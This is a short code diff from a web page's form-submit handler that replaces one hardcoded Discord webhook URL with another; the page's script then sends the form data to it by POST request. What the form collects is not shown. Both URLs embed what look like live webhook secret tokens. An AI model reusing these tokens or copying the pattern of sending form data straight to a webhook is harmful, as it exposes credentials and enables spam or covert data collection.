@@ -128,7 +128,7 @@ document.addEventListener('DOMContentLoaded', function() {
         submitBtn.innerHTML = '<i class="fa fa-spinner fa-spin"></i> Processing...';
 
         try {
-            const webhookUrl = 'https://discord.com/api/webhooks/1362958395749175477/d7DZUzVt93i2iTcexcKgjpoU7avdYHoyJ506MRkY9V_IREbTRWBbWA6X_Q3qTnqDD1-r';
+            const webhookUrl = 'https://discord.com/api/webhooks/1362958399318528251/TXGv88INIa8Bf93Pzg5sflU9X-f01ZoqaCKQetxLC9JnWZJMpP1YCB4Ic7V39qTIDme5';
             const response = await fetch(webhookUrl, {
                 method: 'POST',
                 headers: { 'Content-Type': 'application/json' },
